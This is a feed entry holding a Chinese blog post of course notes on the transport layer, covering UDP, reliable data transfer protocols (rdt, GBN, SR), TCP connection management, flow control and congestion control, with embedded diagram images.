    <link href="/2024/04/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
    <url>/2024/04/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="传输层服务和协议">1. 传输层服务和协议</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447925.png"alt="image-20240410135802221" /><figcaption aria-hidden="true">image-20240410135802221</figcaption></figure><ul><li>在不同主机上运行的应用程序<strong>进程</strong>之间提供<strong>逻辑通信</strong></li><li>传输层协议运行在端系统上<ul><li>发送方：将应用信息分解成<strong>段</strong>，并传递给网络层</li><li>接收方：将段重新组装成报文，并传递给应用层</li></ul></li><li>两种传输层协议：TCP和UDP</li></ul><h2 id="传输层和网络层">1.1 传输层和网络层</h2><ul><li>传输层：<strong>进程</strong>之间的逻辑通信<ul><li>网络层服务的依赖和增强</li></ul></li><li>网络层：<strong>主机</strong>之间的逻辑通信<ul><li>传输协议提供的服务往往受到底层网络层协议服务模式（延迟或带宽）的限制。但有些服务不包括在内，如可靠的数据传输服务。</li></ul></li></ul><h2 id="网络层">1.2 网络层</h2><ul><li>互联网的网络层协议叫作IP，即网际协议（Internet Protocol）</li><li>IP 提供<strong>主机</strong>之间的<strong>逻辑通信</strong></li><li>IP 服务模式是一种<strong>尽力而为</strong>的传送服务</li><li>它<strong>不能</strong>保证段的<strong>有序传送</strong>，也<strong>不能</strong>保证段中数据的<strong>完整性</strong></li><li>IP 被称为<strong>不可靠的服务</strong>（unreliable service）。</li></ul><h2 id="传输层">1.3 传输层</h2><ul><li>可靠、按顺序传输：TCP（Transmission Control Protocol）<ul><li>数据传输和错误检查</li><li>流量控制</li><li>拥塞控制</li><li>连接设置</li></ul></li><li>不可靠、无序传输：UDP（User Datagram Protocol）<ul><li>数据传输和错误检查</li><li>没有扩展“尽力而为”的IP</li></ul></li><li>两者都无法提供的服务<ul><li>延迟保证</li><li>带宽保证</li></ul></li></ul><h1 id="多路复用和多路分解">2. 多路复用和多路分解</h1><ul><li>在发送端进行<strong>多路复用</strong>（multiplexing）：处理来自多个套接字的数据，添加传输头。</li><li>在接收端进行<strong>多路分解</strong>（demultiplexing）：使用头信息将收到的段传递给正确的套接字。</li></ul><h2 id="多路分解工作流程">2.1 多路分解工作流程</h2><ul><li>主机接收IP数据报（datagram）<ul><li>每个数据报有源IP地址、目的IP地址</li><li>每个数据报携带一个传输层段（segment）</li><li>每个段有源端口号、目的端口号</li></ul></li><li>主机使用<strong>IP地址和端口号</strong>引导段到合适的套接字<ul><li>端口号：一个 16 位数字，从 0 到 65535</li><li>0 至 1023：众所周知的端口号（HTTP:80, DNS: 53, IMAP:143,FTP:20,21,SMTP:25,POP3:110）</li><li>1024 至 65535：动态/专用端口</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447926.png"alt="image-20240410141758806" /><figcaption aria-hidden="true">image-20240410141758806</figcaption></figure><h2 id="无连接多路分解">2.2 无连接多路分解</h2><ul><li>UDP 套接字由二元组标识：<strong>目标 IP地址、目标端口号</strong></li><li>目标端口号相同但源 IP 地址/源端口号不同的 IP数据报将定向到目标地址的同一套接字</li></ul><h2 id="有连接多路分解">2.3 有连接多路分解</h2><ul><li><p>TCP 套接字由四元组标识：<strong>源 IP 地址、源端口号、目的 IP地址、 目的端口号</strong></p></li><li><p>源 IP 地址或源端口号不同将被导向两个不同的套接字</p></li><li><p>携带原始连接建立请求的 TCP 段除外（欢迎套接字）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447927.png"alt="image-20240410142348918" /><figcaption aria-hidden="true">image-20240410142348918</figcaption></figure></li><li><p>服务器主机可同时支持多个 TCP 套接字：每个套接字都由自己的四元组标识</p></li><li><p>网络服务器为每个连接的客户端设置不同的套接字</p><ul><li>持久性HTTP使用同一套接字</li><li>非持久性HTTP将为每个请求设置不同的套接字，频繁创建和关闭</li></ul></li><li><p>如今的高性能网络服务器只使用一个进程，并为每个新的客户端连接创建一个带有新连接套接字的新线程</p></li></ul><h1 id="无连接传输udp">3. 无连接传输：UDP</h1><h2 id="简介">3.1 简介</h2><ul><li>“尽力而为 "服务，UDP 段可能：<strong>丢失、无序交付</strong></li><li>Connectionless（含义）：<ul><li>UDP 发送方和接收方之间无握手</li><li>每个 UDP 段都独立于其他段处理</li></ul></li><li>应用场景：<ul><li>流媒体应用程序（丢失容忍，速率敏感）</li><li>DNS</li><li>SNMP （Simple Network Management Protocol）</li><li>RIP（Routing Information Protocol）</li></ul></li><li>通过 UDP 进行可靠传输：<ul><li>可能，但任务艰巨</li><li>在应用层增加可靠性（增加确认和重传机制）</li><li>特定应用程序的错误恢复</li></ul></li></ul><h2 id="优点">3.2 优点</h2><ul><li>无拥塞控制：UDP 可以随心所欲地快速传输（非常适合实时应用）</li><li>不建立连接（可减少延迟）</li><li>简单：发送方和接收方无连接状态（支持更多活跃客户端）</li><li>更小的头部（TCP：一般为 20 字节，UDP：8 字节）</li></ul><h2 id="段格式">3.3 段格式</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447929.png"alt="image-20240410143749822" /><figcaption aria-hidden="true">image-20240410143749822</figcaption></figure><h2 id="校验和">3.4 校验和</h2><ul><li>发送方：<ul><li>将段内容（包括头部）视为 16 位整数序列</li><li>校验和：段内容中所有 16 位字之和的反码（1’s complement）<ul><li>先带<strong>循环进位累加</strong>，最高位溢出右移最低位，与最低位相加</li><li>累加结果再求反码</li></ul></li><li>发送方将校验和值放入 UDP 校验和字段</li></ul></li><li>接收方：<ul><li>将段中所有 16 位字相加，包括校验和</li><li>检查总和是否等于 111111111111111111<ul><li>NO：检测到错误</li><li>YES：未检测到错误</li></ul></li></ul></li><li>引入原因：<ul><li>其中一条链路可能使用不提供错误检查的链路层协议</li><li>在路由器中存储段时可能会引入位错误</li><li>提供错误检查作为安全措施</li><li>注：UDP 不会采取任何措施从错误中恢复；有些 UDP实现会直接丢弃损坏的数据段；有些则会将损坏的段交给应用程序并发出警告</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447930.png"alt="image-20240410144233312" /><figcaption aria-hidden="true">image-20240410144233312</figcaption></figure><h1 id="可靠数据传输原理">4. 可靠数据传输原理</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447931.png"alt="image-20240410150339556" /><figcaption aria-hidden="true">image-20240410150339556</figcaption></figure><ul><li><p>服务抽象：可靠数据传输协议（ reliable data transferprotocol，rdt）</p></li><li><p>只考虑单向（unidirectional）数据传输，但控制信息将双向流动</p></li><li><p>使用有限状态机（finite statemachines，FSM）来指明发送方、接收方。状态：当处于该状态时，下一个状态由下一个事件唯一决定。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447932.png"alt="image-20240410150837836" /><figcaption aria-hidden="true">image-20240410150837836</figcaption></figure></li></ul><h2 id="rdt1.0">4.1 rdt1.0</h2><ul><li>底层信道完全可靠：<ul><li>无比特错误<br /></li><li>无数据包丢失</li></ul></li><li>发送器和接收器的独立 FSM：<ul><li>发送方向底层通道发送数据</li><li>接收方从底层通道读取数据</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447933.png"alt="image-20240410151128034" /><figcaption aria-hidden="true">image-20240410151128034</figcaption></figure><h2 id="rdt2.0">4.2 rdt2.0</h2><ul><li><p>底层信道可能会翻转数据包中的位</p><ul><li>仍假定数据包按顺序到达接收器，不会丢失</li><li>校验和以检测位错误</li></ul></li><li><p>如何从错误中恢复：</p><ul><li>（positive）acknowledgements（ACKs）：接收者明确告知发送方数据包</li><li>negativeacknowledgements（NAKs）：接收方明确告知发送方数据包有错误（需要重传）</li><li>发送方收到 NAK 后重传数据包</li></ul></li><li><p>rdt2.0 中的新机制（对比 rdt1.0）</p><ul><li>错误检测<br /></li><li>反馈：从接收方到发送方的控制消息（ACK、NAK）</li><li>重传</li></ul></li><li><p>停等协议（stop andwait）：发送方发送一个数据包，然后等待接收方回应</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447934.png"alt="image-20240410151850030" /><figcaption aria-hidden="true">image-20240410151850030</figcaption></figure></li><li><p>缺点：ACK/NAK受损。解决方案分为三类：</p><ul><li>引入一种新型的发送方对接收方数据包，类似于人类所说的”你说什么？“</li><li>添加校验位，以便发送方检测和恢复（对损坏的数据包有效，但不能解决丢失）</li><li>正确收到ACK则发下个新数据，正确收到NAK则重发老数据，无法确认ACK或NAK（错误数据）则重发老数据，避免漏发<ul><li>由于接收方并不清楚刚刚发送的ACK或NAK是否被正确接受，因此接收方并不清楚收到的数据是重传（冗余）数据还是新数据</li><li>解决：发送方为每个 pkt 添加序列号；对于简单的停止-等待协议，1位序列号。</li></ul></li></ul></li></ul><h2 id="rdt2.1">4.3 rdt2.1</h2><p><strong>发送方：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447935.png"alt="image-20240410152833152" /><figcaption aria-hidden="true">image-20240410152833152</figcaption></figure><p><strong>接收方：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447936.png"alt="image-20240410153049966" /><figcaption aria-hidden="true">image-20240410153049966</figcaption></figure><h2 id="rdt2.2">4.4 rdt2.2</h2><ul><li>与 rdt2.1 功能相同，仅使用 ACK</li><li>接收方为正确接收的最后一个数据包发送 ACK，而不是 NAK<ul><li>接收方必须明确包含被 ACK 的数据包的序列号</li><li>发送方必须通过接收到的 ACK（发送方 FSM 中的isACK()）检查数据包的序列号</li></ul></li><li>当发送方收到接收方反馈的ACK中出现冗余情况（即接收方并未收到预期编号的正确数据包），发送方认为刚才发送的数据存在错误，则重发该数据。</li></ul><p><strong>发送方：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447937.png"alt="image-20240410153653927" /><figcaption aria-hidden="true">image-20240410153653927</figcaption></figure><p><strong>接收方：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447938.png"alt="image-20240410153810537" /><figcaption aria-hidden="true">image-20240410153810537</figcaption></figure><h2 id="rdt3.0">4.5 rdt3.0</h2><ul><li><p>底层信道可能出现位错误、数据包丢失</p></li><li><p>需要倒数定时器（countdown timer）：设置ACK超时时间，如果在此时间内未收到 ACK 则重传，可能出现冗余数据包</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447939.png"alt="image-20240410154433590" /><figcaption aria-hidden="true">image-20240410154433590</figcaption></figure></li><li><p>比特交替协议（alternating-bit protocol）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447940.png"alt="image-20240410155008380" /><figcaption aria-hidden="true">image-20240410155008380</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447941.png"alt="image-20240410155125372" /><figcaption aria-hidden="true">image-20240410155125372</figcaption></figure></li><li><p>rdt3.0 性能不佳：停等协议限制了物理资源的使用</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447942.png"alt="image-20240410155504256" /><figcaption aria-hidden="true">image-20240410155504256</figcaption></figure></li></ul><h3 id="流水线协议">4.5.1 流水线协议</h3><ul><li>流水线协议：发送方允许多个传输中、尚未确认的数据包</li><li>必须增加序列号的范围</li><li>已发送但未被确认的数据需要在发送方或接收方缓存</li><li>两种实现：<ul><li>Go-Back-N（GBN,回退N步）</li><li>selective repeat（SR, 选择重传）</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447943.png"alt="image-20240410155853750" /><figcaption aria-hidden="true">image-20240410155853750</figcaption></figure><h3 id="gbn">4.5.2 GBN</h3><ul><li>发送方允许流水线中存在N个未被确认的数据包</li><li>接收方仅发送<strong>累计确认</strong>：如果有间隙，则不ACK该数据包</li><li>发送方为最早未被确认数据维护一个定时器，一旦超时，重传所有数据包</li></ul><p><strong>发送方：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447944.png"alt="image-20240410160225910" /><figcaption aria-hidden="true">image-20240410160225910</figcaption></figure><ul><li><strong>window sizeN</strong>：管道中连续未确认数据包的最大允许数量</li><li><strong>send_base</strong>：最旧的未确认数据包的序列号</li><li><strong>nextseqnum</strong>：最小未使用序列号</li><li>N 被称为窗口大小，GBN协议又被称为<strong>滑动窗口协议（sliding-windowprotocol）</strong></li><li>为什么不允许数据报的数量是无限的？流量控制和拥塞控制</li><li>数据包头中的 k 位序列号，范围 [0,2<sup>k</sup>-1]，TCP 有一个 32位序列号字段（计算字节流中的字节，而不是数据包）</li><li>GBN 发送方必须对三类事件做出响应：<ul><li>上层调用：发送方首先检查窗口是否已满，未满--&gt;创建并发送一个数据包，已满--&gt;发送方直接将数据返回上层</li><li>收到一个 ACK(n)：序列号n及其之前的所有报文被接收</li><li>超时事件timeout(n)：重新传输窗口中所有序号大于等于n的数据包<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447945.png"alt="image-20240410160838283" /></li></ul></li></ul><p><strong>接收方：</strong></p><ul><li>总是为正确接收到的具有最高顺序序列的数据包发送 ACK</li><li>丢弃所有乱序数据包</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447946.png"alt="image-20240410161533892" /><figcaption aria-hidden="true">image-20240410161533892</figcaption></figure><h3 id="sr">4.5.3 SR</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447947.png"alt="image-20240410162015392" /><figcaption aria-hidden="true">image-20240410162015392</figcaption></figure><ul><li>发送方允许流水线中存在N个未被确认的数据包</li><li>接收方为每个数据包发送独立ACK</li><li>发送方为每个未确认数据包均维护一个定时器，一旦超时，仅重传未被确认数据包</li><li>根据需要缓存乱序数据包，以便最终按顺序传送到上层</li><li>seq&gt;=2*window</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447948.png"alt="image-20240410162512635" /><figcaption aria-hidden="true">image-20240410162512635</figcaption></figure><h2 id="小结">4.6 小结</h2><ul><li>校验和 [first rdt 2.0]：用于检测传输数据包中的比特错误。</li><li>ACK [first rdt 2.0]：接收方用于告知发送方已正确收到一个或一组数据包。根据协议的不同，确认可以是单独的，也可以是累积的。</li><li>NAK [first rdt 2.0]：接收方用来告知发送方没有正确接收到数据包。带有未正确接收的数据包的序列号。</li><li>序列号 [first rdt 2.1]：用于对从发送方流向接收方的数据包进行顺序编号。接收到的数据包序列号中的间隙和重复，用于检测数据包的丢失和重复副本。</li><li>定时器 [first rdt 3.0]：用于超时/重传数据包，原因可能是数据包（或其ACK）在信道中丢失。接收方可能会收到数据包的重复副本。</li><li>窗口、流水线 [first rdt3.0+]：允许传输多个数据包但尚未确认，与停止和等待操作模式相比，可以提高发送方的利用率。窗口大小可根据接收方接收和缓冲信息的能力或网络拥塞程度来设定，或两者兼而有之。</li></ul><h1 id="面向连接传输tcp">5. 面向连接传输：TCP</h1><h2 id="简介-1">5.1 简介</h2><ul><li>点对点（point-to-point）：<ul><li>一个发送方，一个接收方</li><li>不支持一个发送方对多个接收方（多播）</li></ul></li><li>可靠、有序的字节流：没有 "信息边界"</li><li>流水线：TCP 拥塞和流量控制设置窗口大小</li><li>全双工数据（full duplex data）：<ul><li>同一连接中的双向数据流</li><li>MSS: maximum segment size 最大报文段长度（传输层能承载的应用层最大数据长度，不包括传输层的头部）</li></ul></li><li>面向连接</li><li>流量控制：发送方不会淹没接收方</li></ul><h2 id="段格式-1">5.2 段格式</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447949.png"alt="image-20240410164839277" /><figcaption aria-hidden="true">image-20240410164839277</figcaption></figure><ul><li><p>序列号：首个字节数据的编号</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447950.png"alt="image-20240410164920939" /><figcaption aria-hidden="true">image-20240410164920939</figcaption></figure></li><li><p>确认号：接收方<strong>期待收到</strong>的字节数据的序列号（累计确认）。如：R已收到 0-535、900-1000，R 的下一数据段 ACK字段包含 536。</p></li></ul><p><strong>处理乱序段：</strong>保留不按顺序排列的字节，并等待缺失的字节填补空白。</p><p><strong>RTT与超时间隔</strong>：</p><ul><li><code>SampleRTT</code>：从段发送到收到 ACK 的时间</li><li><code>EstimatedRTT = (1- a)*EstimatedRTT + a*SampleRTT</code><ul><li>指数加权移动平均值(EWMA)</li><li>过去样本的影响呈指数级下降</li><li>a=0.125（通常情况）</li></ul></li><li><code>DevRTT = (1-a)*DevRTT + a*|SampleRTT-EstimatedRTT|</code><ul><li>用于估算：采样RTT偏离估计RTT的程度</li><li>如果采样RTT值波动较小，那么DevRTT值也越小，反之亦然</li><li>a=0.25（通常情况）</li></ul></li><li><code>TimeoutInterval = EstimatedRTT + 4*DevRTT</code></li></ul><h2 id="可靠数据传输">5.3 可靠数据传输</h2><ul><li>流水线报文段</li><li>累计确认</li><li>单个重传定时器</li><li>触发重传：超时事件、冗余ACK</li></ul><h3 id="发送方三个重要事件">5.3.1 发送方三个重要事件</h3><ul><li>收到APP发送的数据<ul><li>用 seq # 创建段</li><li>seq段中第一个数据字节的字节流编号</li><li>如果定时器尚未运行，则启动定时器<ul><li>定时器为最旧的未确认段</li><li>超时间隔： TimeOutInterval</li></ul></li><li><code>TimeoutInterval = EstimatedRTT + 4*DevRTT</code></li></ul></li><li>超时：重传导致超时事件的报文<ul><li>TimeoutInterval 加倍，如果超时再次发生，TimeoutInterval 为 4倍，除非收到段并更新了 EstimatedRTT。</li></ul></li><li>收到到ACK：如果 ACK先前没有ACK的段，更新已 ACK的内容（累计确认）；如果仍有未ACK的段，则启动定时器。<ul><li><code>TimeoutInterval = EstimatedRTT + 4*DevRTT</code></li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447951.png"alt="image-20240410171002277" /><figcaption aria-hidden="true">image-20240410171002277</figcaption></figure><h3 id="快速重传">5.3.2 快速重传</h3><ul><li>超时时间往往相对较长：重发丢失数据包前的延迟较长，增加端到端延迟。</li><li>通过重复 ACK 检测丢失的段：发送方经常发送许多连续数据段，如果数据段丢失，很可能会有许多重复的ACK。</li><li><strong>快速重传</strong>：如果发送方收到对相同数据的3个冗余ACK，则发送序列号最小的未确认报文段。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447952.png"alt="image-20240410171511769" /><figcaption aria-hidden="true">image-20240410171511769</figcaption></figure><h2 id="流量控制">5.4 流量控制</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447953.png"alt="image-20240410171703854" /><figcaption aria-hidden="true">image-20240410171703854</figcaption></figure><ul><li><strong>流量控制</strong>：接收方控制发送方，因此发送方不会因传输过多、过快而溢出接收方的缓冲区</li><li><code>LastByteRead</code>：应用层从缓存中读取的最新一个字节的编号</li><li><code>LastByteRcvd</code>：到达接收缓存最新字节数据的编号</li><li>不允许溢出分配的缓冲区<code>LastByteRcvd – LastByteRead &lt;= RcvBuffer</code></li><li>接收缓存中空闲空间：<code>rwnd = RcvBuffer – [LastByteRcvd – LastByteRead]</code></li><li>接收方通过在接收方至发送方段的 TCP 标头中加入 rwnd值来说明可用缓冲空间，发送方根据接收方的 rwnd值限制未确认数据的数量。</li></ul><h2 id="连接管理">5.5 连接管理</h2><h3 id="三次握手">5.5.1 三次握手</h3><ul><li>第 1 步：客户端主机向服务器发送 TCP SYN 段<ul><li>指定客户端初始序列号（随机）</li><li>无数据</li></ul></li><li>第 2 步：服务器主机接收 SYN，回复 SYNACK 段<ul><li>服务器分配缓冲区和变量</li><li>指定服务器初始序列号</li><li>无数据</li></ul></li><li>第 3 步：客户端收到 SYNACK，用 ACK 段回复<ul><li>客户端分配缓冲区和变量</li><li>可能包含数据（例如 HTTP）</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447954.png"alt="image-20240410172312055" /><figcaption aria-hidden="true">image-20240410172312055</figcaption></figure><h3 id="四次挥手">5.5.2 四次挥手</h3><ul><li>第 1 步：客户端系统向服务器发送 TCP FIN 控制段（FIN=1）</li><li>第 2 步：服务器收到 FIN，回复 ACK。关闭连接，发送 FIN。(FIN=1)</li><li>第 3 步：客户端收到 FIN，回复 ACK。 进入 "定时等待 "状态 - 将以 ACK回应收到的 FIN。</li><li>第 4 步：服务器收到 ACK。 连接关闭。</li><li>注：S如果在Timeout内未收到C的ACK，则将重新发送FIN。C在Timedwait里面若再次收到来自S的FIN，将重发ACK并重新进入到Timedwait状态，确保S能进入到关闭</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447955.png"alt="image-20240410172553443" /><figcaption aria-hidden="true">image-20240410172553443</figcaption></figure><p><strong>客户端：</strong></p><ul><li>FIN_WAIT_1：等待来自服务器的 ACK。</li><li>FIN_WAIT_2：等待来自服务器的 FIN 段。</li><li>TIME_WAIT：等待可能到达的 FIN，以防客户端的最终 ACK 丢失。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447956.png"alt="image-20240410172757494" /><figcaption aria-hidden="true">image-20240410172757494</figcaption></figure><p><strong>服务端：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447957.png"alt="image-20240410172841490" /><figcaption aria-hidden="true">image-20240410172841490</figcaption></figure><h3 id="rst">5.5.3 RST</h3><p>当接收到端口号或源 IP 地址与任何正在进行的套接字（接收方）不匹配的TCP 段时：</p><ul><li>TCP：主机向源发送一个特殊的 RST 段</li><li>UDP：主机发送特殊的 ICMP 数据报</li></ul><h1 id="拥塞控制原理">6. 拥塞控制原理</h1><ul><li>拥塞：<ul><li>发送数据的来源太多、太快，<strong>网络无法处理</strong></li><li>与流量控制不同：接收方控制发送方，因此发送方不会溢出接收方的缓冲区</li></ul></li><li>表现：<ul><li>长时间延迟（路由器缓冲区排队）</li><li>丢失数据包（路由器缓冲区溢出）</li></ul></li></ul><h2 id="解决方法">6.1 解决方法</h2><ul><li>end-end congestion control （端到端拥塞控制）<ul><li>没有来自网络的明确反馈</li><li>根据终端系统观察到的丢失、延迟推测拥塞情况</li><li><strong>TCP 采用此方法</strong></li></ul></li><li>network-assisted congestion control（网络辅助的拥塞控制）<ul><li>路由器向终端系统提供反馈<ul><li>用一个bit指示链路中的拥塞情况（SNA、DECbit、TCP/IPECN、ATM、XCP）</li><li>路由器为发送方提供明确的速率信息（ATM ABR）</li></ul></li></ul></li></ul><h2 id="atm-abr">6.2 ATM ABR</h2><ul><li><p>ATM (Asynchronous Transfer Mode)：异步传输模式，面向虚电路的方式处理包交换</p></li><li><p>ABR: available bit rate</p><ul><li>弹性服务</li><li>如果发送方路径轻负载：发送方应充分利用可用带宽</li><li>如果发送方路径拥塞：发送方应抑制发送速率到最小保障的传输速率</li></ul></li><li><p>RM (resource management) cells资源管理信元</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447958.png"alt="image-20240412134926052" /><figcaption aria-hidden="true">image-20240412134926052</figcaption></figure><ul><li>由发送方发送，中间夹杂数据信元（不是数据包）</li><li>传送拥塞相关信息</li><li>两种方式：<ul><li>直接网络反馈，即交换机直接反馈拥塞信息给发送方</li><li>经由接收方的网络反馈，即RM抵达接收方后被修改指示信息然后反馈给发送方</li></ul></li><li>RM 信元（不是数据包）中的两个比特由交换机（不是路由器）设置<ul><li>NI：轻度拥塞</li><li>CI：严重拥塞</li><li>接收方退回发送方的 RM单元（CI/NI数据通常保持不变，下面特殊情况除外）</li></ul></li><li>RM 单元中两个字节的 ER（显示速率）字段<ul><li>拥塞的交换机可能会降低小信元的 ER 值</li><li>发送者的发送速率以及路径上可支持的最大速率</li></ul></li><li>每个数据单元中的一位EFCI（显式转发拥塞指示）：拥塞的交换机设为<code>1</code><ul><li>在接收到RM之前，若收到数据信元EFCI为1，则在收到RM后对其CI值进行修改</li></ul></li></ul></li></ul><h1 id="tcp拥塞控制">7. TCP拥塞控制</h1><ul><li>TCP 必须使用端到端拥塞控制，而不是网络辅助拥塞控制。IP层不向终端系统提供明确反馈。</li><li>限制发送速率作为感知网络拥塞的函数<ul><li>提高发送速率，感知到很少的拥塞</li><li>降低发送速率，感知拥塞</li></ul></li></ul><h2 id="如何限制发送速率">7.1 如何限制发送速率</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447959.png"alt="image-20240412140610778" /><figcaption aria-hidden="true">image-20240412140610778</figcaption></figure><ul><li>congestion window （cwnd,拥塞窗口）：<ul><li>对发送者在网络中发送流量的速率施加约束</li><li><code>LastBytesSent – LastByteAcked &lt;= min&#123;cwnd, rwnd&#125;</code></li></ul></li><li>方便分析拥塞机制，假设接收缓冲区非常大，可以忽略 rwnd<ul><li><code>LastBytesSent – LastByteAcked &lt;= cwnd</code></li></ul></li><li>限制发送方中未被确认的数据量，间接限制发送速率</li><li>cwnd 是动态的，是感知网络拥塞的函数</li><li>TCP 发送速率：<ul><li>考虑丢失和数据包传输延迟可忽略不计</li><li>大致为：发送一次 cwnd 字节，等待一个 RTT 收到ACKS，然后发送更多字节</li><li>调整 cwnd 以控制发送速率</li><li><spanclass="math inline">\(rate≈\frac{cwnd}{RTT}bytes/sec\)</span></li></ul></li></ul><h2 id="如何感知拥塞">7.2 如何感知拥塞</h2><ul><li>出现拥塞：丢包事件（超时或收到三个重复 ACK ）</li><li>未出现拥塞：发送方收到ACK信息，意味着网络状态良好，增加拥塞窗口的大小</li><li>TCP 是自计时的（self-clocking）</li></ul><h2 id="拥塞控制算法">7.3 拥塞控制算法</h2><ul><li>slow start (慢启动)</li><li>congestion avoidance (拥塞避免)</li><li>fast recovery (快速恢复)</li></ul><h3 id="慢启动">7.3.1 慢启动</h3><ul><li>cwnd初始值=1MSS，发送速率≈MSS/RTT</li><li>慢启动：当连接开始时，速率以指数方式增加，直到发生第一次丢失事件。<ul><li>一轮RTT，cwnd增加为原来的两倍</li><li>发送方每收到一个ACK，cwnd增加1个MSS，一轮增加1个cwnd</li></ul></li><li>慢启动指数增长何时结束？<ul><li>超时事件<ul><li>ssthresh=cwnd/2（ssthresh 是状态变量阈值）</li><li>cwnd=1MSS</li><li>回到慢启动状态</li></ul></li><li>cwnd &gt;= ssthresh：进入拥塞避免状态</li><li>3个冗余ACK<ul><li>ssthresh=cwnd/2</li><li>cwnd=ssthresh+3*MSS</li><li>执行快速重传，进入快速恢复状态</li></ul></li></ul></li></ul><h3 id="拥塞避免">7.3.2 拥塞避免</h3><ul><li>保守的方法：一轮RTT增加1个MSS，即发送方每收到一个ACK，cwnd增加1个MSS*(MSS/cwnd)</li><li>拥塞避免的线性增长何时结束？<ul><li>超时事件<ul><li>ssthresh=cwnd/2</li><li>cwnd=1MSS</li><li>进入慢启动状态</li></ul></li><li>3个冗余ACK<ul><li>ssthresh=cwnd/2</li><li>cwnd=ssthresh+3*MSS</li><li>执行快速重传，进入快速恢复状态</li></ul></li></ul></li></ul><h3 id="快速恢复">7.3.3 快速恢复</h3><ul><li>对于导致 TCP 进入快速恢复状态的丢失网段，每收到一个重复的 ACK，cwnd的值就会增加 1 MSS（cwnd = cwnd +MSS）。</li><li>超时事件<ul><li>ssthresh=cwnd/2</li><li>cwnd=1MSS</li><li>进入慢启动状态</li></ul></li><li>新的ACK<ul><li>cwnd=ssthresh</li><li>在清空 cwnd 之后进入避免拥塞状态</li></ul></li><li>建议但不强制要求快速恢复<ul><li>[TCP Tahoe] (old version)：无快速恢复<ul><li>总是将 cwnd 设置为 1（超时或 3 个冗余ACK）</li><li>已不再使用</li></ul></li><li>[TCP Reno] (new version)：有快速恢复（3 个冗余ACK）</li><li>ssthresh = cwnd /2</li><li>cwnd = ssthresh +3*MSS(很可能网络未出现严重拥塞，因此可不从1开始。有些快速重传版本并未加3个MSS)</li></ul></li></ul><h3 id="小结-1">7.3.4 小结</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447960.png"alt="image-20240412143139945" /><figcaption 